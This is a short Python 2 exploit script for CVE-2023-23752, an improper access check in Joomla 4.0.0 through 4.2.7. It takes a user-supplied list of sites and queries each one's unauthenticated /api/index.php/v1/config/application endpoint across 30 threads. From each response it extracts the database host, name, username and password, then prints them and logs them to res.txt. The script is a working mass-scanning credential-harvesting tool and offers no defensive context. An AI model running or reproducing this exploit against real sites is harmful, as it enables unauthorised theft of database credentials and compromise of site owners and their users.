#An issue was discovered in Joomla! 4.0.0 through 
#4.2.7. An improper access check allows 
#unauthorized access to webservice endpoints.
import requests,time,re,random,os,sys,json
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore,Style, init
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL


def jomprv(url):
	try:
		headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36'}
		asw = requests.get(url+ '/api/index.php/v1/config/application?public=true',headers=headers,timeout=10)
		if 'dbtype' in asw.content:
			hoset = re.findall('"host":"(.*?)"',asw.content)[0]
			debst = re.findall('"db":"(.*?)"',asw.content)[0]
			uset = re.findall('"user":"(.*?)"',asw.content)[0]
			paset = re.findall('"password":"(.*?)"',asw.content)[0]
			print ("Domaij" + " : " + url)
			print (g + "HOST" + " : " + hoset)
			print (g + "DB" + " : " + debst)
			print (g + "User" + " : " + uset)
			print (g + "Pass" + " : " + paset)
			open('res.txt', 'a').write('\n!== Results Joomla CVE-2023-23752 ==!\n'+ 'DOMAIN' + ' : ' + url +'\nHOST' + ' : ' + hoset+'\nDB' + ' : ' +debst+'\nUSER' + ' : ' + uset+'\nPASS' + ' : ' + paset+'\n')
		else:
			print(r+ 'BAD' + ' ' + url)
			#for res in regex:
	except:
		pass

print "{}JOOMLA! CVE-2023-23752  | Shin Code\n".format(y)
url = open(raw_input(o+'List:~# '),'r').read().splitlines()
pool = ThreadPool(int(30))
pool.map(jomprv, url)
pool.close()
pool.join()